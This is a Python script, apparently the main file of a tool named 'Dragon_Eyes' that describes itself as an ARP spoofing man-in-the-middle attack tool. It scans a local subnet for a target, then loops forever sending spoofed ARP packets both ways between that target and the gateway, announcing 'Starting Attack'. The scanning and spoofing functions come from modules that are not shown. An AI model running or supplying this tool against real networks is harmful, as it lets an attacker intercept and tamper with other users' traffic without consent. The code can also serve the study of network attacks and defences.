from Modules.Scan import *
import argparse
from colorama import Fore
import time
from Core.Banner import *
# ARG.add_argument('-t', dest='accumulate', action='store_const', const=sum, default=max,help='sleep time suppression between each request')

ARG = argparse.ArgumentParser(description='This tool for ARP spoofing ( MITM )', epilog='Example : python3 Dragon_Eyes.py -i 192.168.1.0/24 -192.168.1.1')
ARG.add_argument('-i', dest='IP', default='192.168.1.0/24', type=str ,help='IP range 192.168.1.0/24')
ARG.add_argument('-t', default=3, dest='Time', type=int, help='sleep time suppression between each request')
ARG.add_argument('-r', default=10, dest='Scan', type=int, help='Scan times')
ARG.add_argument('-n', default='192.168.1.1', dest='Network', type=str, help='IP network ')

Banner_dragon()

IDN = ARG.parse_args()
the_ip = IDN.IP
the_time = IDN.Time
the_scan = IDN.Scan
the_network = IDN.Network

flag = 1
while flag < 5:
    print("\r[ Starting scan all IP in network ] " + ("." * flag), end=" ")
    time.sleep(1)
    flag = flag + 1

Target = Scan_arp(the_ip, the_time, the_scan, the_network)
print(f'Starting Attack ==> {Fore.RED}{Target}{Fore.WHITE}')
try:
    while True:

        # target to spoof
        spoof(Target, the_network)
        # spoof to target
        spoof(the_network, Target)
        print(
            f'{Fore.CYAN}[{Fore.GREEN}+{Fore.CYAN}]{Fore.WHITE} Done send Packet ...')
        time.sleep(8)

except:
    pass

